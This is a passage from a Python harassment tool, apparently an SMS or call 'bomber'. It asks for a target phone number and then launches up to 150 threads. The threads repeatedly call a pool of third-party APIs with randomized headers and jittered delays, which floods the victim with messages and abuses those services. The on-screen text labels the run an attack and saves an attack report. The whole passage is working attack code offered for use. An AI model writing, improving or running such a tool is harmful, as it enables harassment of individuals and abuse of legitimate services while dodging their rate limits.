    print(f"{C.YELLOW}  ▸ Press ENTER to use auto value{C.RESET}")
    print(f"{C.YELLOW}  ▸ Or enter custom (1-150){C.RESET}")
    try:
        val = input(f"{C.MAGENTA}  ▶ Threads [{detector.config['threads']}]: {C.RESET}").strip()
        if not val:
            return detector.config['threads']
        return max(1, min(int(val), 150))
    except ValueError:
        return detector.config['threads']


def get_custom_delay(detector):
    print(f"\n{C.CYAN}┌{'─' * 60}┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.GREEN}⏱️  DELAY CONFIGURATION{C.RESET}"
          f"{' ' * 37}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└{'─' * 60}┘{C.RESET}")
    print(f"{C.NEON}  ✅ Auto-Detected Delay: {detector.config['delay']}s{C.RESET}")
    print(f"{C.YELLOW}  ▸ 0 = No delay | 0.1-0.5 = Recommended{C.RESET}")
    try:
        val = input(f"{C.MAGENTA}  ▶ Delay [{detector.config['delay']}]: {C.RESET}").strip()
        if not val:
            return detector.config['delay']
        return max(0, min(float(val), 5))
    except ValueError:
        return detector.config['delay']


def call_api(api, timeout=10):
    try:
        headers = get_random_headers()
        if api["method"] == "GET":
            resp = requests.get(api["url"], headers=headers, timeout=timeout, allow_redirects=True)
        else:
            resp = requests.post(api["url"], json=api["payload"] if api["payload"] else {},
                                 headers=headers, timeout=timeout, allow_redirects=True)
        return resp.status_code
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        return "CONN_ERR"
    except requests.exceptions.TooManyRedirects:
        return "REDIRECT"
    except Exception:
        return "ERROR"


SPINNER_FRAMES = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
PULSE_FRAMES = ['●', '◉', '○', '◌']


def format_time(seconds):
    if seconds < 60:
        return f"{seconds:.0f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f}m"
    else:
        return f"{seconds/3600:.1f}h"


def bomb_thread(target_number, thread_id, api_pool, delay, timeout):
    spinner_idx = 0
    pulse_idx = 0
    consecutive_errors = 0

    while not stop_flag["stop"]:
        try:
            api = random.choice(api_pool)
            display = api["domain"]
            if len(display) > 28:
                display = display[:26] + ".."

            status = call_api(api, timeout=timeout)

            spinner = SPINNER_FRAMES[spinner_idx % len(SPINNER_FRAMES)]
            pulse = PULSE_FRAMES[pulse_idx % len(PULSE_FRAMES)]
            spinner_idx += 1
            pulse_idx += 1

            with lock:
                stats["total"] += 1

                if isinstance(status, int) and 200 <= status < 300:
                    stats["success"] += 1
                    status_color = C.GREEN
                    status_text = f"{pulse} OK"
                    consecutive_errors = 0
                elif isinstance(status, int) and 300 <= status < 400:
                    stats["success"] += 1
                    status_color = C.CYAN
                    status_text = f"↪ {status}"
                    consecutive_errors = 0
                elif isinstance(status, int) and 400 <= status < 500:
                    stats["failed"] += 1
                    status_color = C.YELLOW
                    status_text = f"⚠ {status}"
                    consecutive_errors = 0
                elif status == "TIMEOUT":
                    stats["timeout"] += 1
                    status_color = C.ORANGE
                    status_text = "⏱ TMO"
                    consecutive_errors += 1
                elif status == "CONN_ERR":
                    stats["error"] += 1
                    status_color = C.RED
                    status_text = "🔌 ERR"
                    consecutive_errors += 1
                else:
                    stats["failed"] += 1
                    status_color = C.RED
                    status_text = f"✖ {status}"
                    consecutive_errors += 1

                total = stats["total"]
                ok_ratio = stats["success"] / total if total else 0
                elapsed = time.time() - start_time
                rate = total / elapsed if elapsed > 0 else 0

                bar_width = 15
                filled = int(bar_width * ok_ratio)
                bar = f"{C.GREEN}{'█' * filled}{C.DIM}{'░' * (bar_width - filled)}{C.RESET}"

                line = (
                    f"\r{C.CYAN}[{thread_id:02d}]{C.RESET} "
                    f"{C.MAGENTA}{spinner}{C.RESET} "
                    f"{status_color}{status_text:<8}{C.RESET} "
                    f"{C.WHITE}{display:<28}{C.RESET} "
                    f"│ {bar} "
                    f"{C.NEON}Σ{total:<6}{C.RESET} "
                    f"{C.GREEN}✓{stats['success']:<5}{C.RESET}"
                    f"{C.RED}✗{stats['failed']:<5}{C.RESET}"
                    f"{C.YELLOW}⏱{stats['timeout']:<4}{C.RESET}"
                    f"{C.GOLD}{rate:.0f}/s{C.RESET}"
                )
                print(line, end='', flush=True)

            if delay > 0:
                actual_delay = delay * (2 if consecutive_errors > 3 else 1)
                time.sleep(random.uniform(actual_delay * 0.5, actual_delay * 1.5))

        except KeyboardInterrupt:
            stop_flag["stop"] = True
            break
        except Exception:
            with lock:
                stats["failed"] += 1
            time.sleep(0.5)


def print_stats():
    elapsed = time.time() - start_time
    total = stats["total"]

    print(f"\n\n{C.CYAN}{'═' * 65}{C.RESET}")
    print(f"  {C.RED}{C.BOLD}⏹  ATTACK COMPLETED{C.RESET}")
    print(f"{C.CYAN}{'═' * 65}{C.RESET}")

    print(f"  {C.WHITE}Duration    : {C.YELLOW}{format_time(elapsed)}{C.RESET}")
    print(f"  {C.WHITE}Total Sent  : {C.CYAN}{total}{C.RESET}")
    print(f"  {C.WHITE}Success     : {C.GREEN}{stats['success']}{C.RESET}")
    print(f"  {C.WHITE}Failed      : {C.RED}{stats['failed']}{C.RESET}")
    print(f"  {C.WHITE}Timeout     : {C.ORANGE}{stats['timeout']}{C.RESET}")
    print(f"  {C.WHITE}Errors      : {C.RED}{stats['error']}{C.RESET}")

    if total:
        rate = stats["success"] / total * 100
        speed = total / elapsed if elapsed > 0 else 0
        print(f"  {C.WHITE}Hit Rate    : {C.MAGENTA}{rate:.1f}%{C.RESET}")
        print(f"  {C.WHITE}Speed       : {C.CYAN}{speed:.1f} req/s{C.RESET}")

    print(f"{C.CYAN}{'═' * 65}{C.RESET}\n")


def save_report(target, thread_count, delay, detector):
    try:
        report = {
            "tool": TOOL_NAME,
            "version": VERSION,
            "creator": CREATOR_NAME,
            "target": target,
            "device_info": {
                "os": platform.system(),
                "os_version": platform.release(),
                "machine": platform.machine(),
                "cpu_cores": detector.cpu_count,
                "ram_gb": detector.ram_gb,
                "device_tier": detector.device_tier,
                "network_speed": detector.network_speed,
                "is_termux": detector.is_termux,
                "is_pydroid": detector.is_pydroid,
                "is_vps": detector.is_vps,
            },
            "config": {
                "threads": thread_count,
                "delay": delay,
                "timeout": detector.config["timeout"],
            },
            "results": {
                "total": stats["total"],
                "success": stats["success"],
                "failed": stats["failed"],
                "timeout": stats["timeout"],
                "error": stats["error"],
                "duration": time.time() - start_time,
            },
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        with open("attack_report.json", "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        print(f"{C.GREEN}  💾 Report saved: attack_report.json{C.RESET}\n")
    except Exception as e:
        print(f"{C.RED}  ⚠ Failed to save report: {e}{C.RESET}\n")


# ============================================================
#                    MAIN
# ============================================================

if __name__ == "__main__":
    set_title(f"{TOOL_NAME} v{VERSION} — {CREATOR_NAME}")
    
    # === DEVICE AUTO-DETECTION ===
    detector = DeviceDetector()
    
    banner(detector)
    detector.display_info()
    
    print(f"\n{C.GREEN}  ✅ Device detected! Auto-config applied.{C.RESET}")
    print(f"{C.YELLOW}  ▸ Press ENTER to start with auto settings{C.RESET}")
    input(f"{C.MAGENTA}  ▶ Press ENTER to continue...{C.RESET}")

    target = get_target()
    if not target:
        print(f"{C.RED}  ✖ Invalid number!{C.RESET}")
        sys.exit()

    full_api_list = build_api_list(target)

    # Ask for custom override (optional)
    print(f"\n{C.CYAN}{'─' * 60}{C.RESET}")
    print(f"{C.GOLD}  🎛️  OPTIONAL: Override Auto Settings{C.RESET}")
    print(f"{C.CYAN}{'─' * 60}{C.RESET}")
    override = input(f"{C.MAGENTA}  ▶ Override auto settings? (y/N): {C.RESET}").strip().lower()
    
    if override == 'y':
        thread_count = get_custom_config(detector)
        delay = get_custom_delay(detector)
    else:
        thread_count = detector.config['threads']
        delay = detector.config['delay']
    
    timeout = detector.config['timeout']

    print(f"\n{C.CYAN}{'═' * 65}{C.RESET}")
    print(f"  {C.GREEN}🚀 SYSTEM INITIALIZED{C.RESET}")
    print(f"  {C.WHITE}Target     : {C.YELLOW}{target}{C.RESET}")
    print(f"  {C.WHITE}APIs Loaded: {C.YELLOW}{len(full_api_list)}{C.RESET}")
    print(f"  {C.WHITE}Threads    : {C.YELLOW}{thread_count}{C.RESET}")
    print(f"  {C.WHITE}Delay      : {C.YELLOW}{delay}s{C.RESET}")
    print(f"  {C.WHITE}Timeout    : {C.YELLOW}{timeout}s{C.RESET}")
    print(f"  {C.WHITE}Device Tier: {C.NEON}{detector.device_tier}{C.RESET}")
    print(f"  {C.WHITE}Network    : {C.NEON}{detector.network_speed.upper()}{C.RESET}")
    print(f"{C.CYAN}{'═' * 65}{C.RESET}")

    print(f"\n{C.MAGENTA}{C.BOLD}  💣 LAUNCHING ATTACK...{C.RESET}")
    print(f"{C.YELLOW}  ⏹  Press Ctrl+C to STOP{C.RESET}\n")

    time.sleep(1.5)

    threads = []
    for i in range(thread_count):
        t = Thread(target=bomb_thread, args=(target, i + 1, full_api_list, delay, timeout))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.02)

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.2)
    except KeyboardInterrupt:
        stop_flag["stop"] = True

    print_stats()
    save_report(target, thread_count, delay, detector)

    sys.exit()
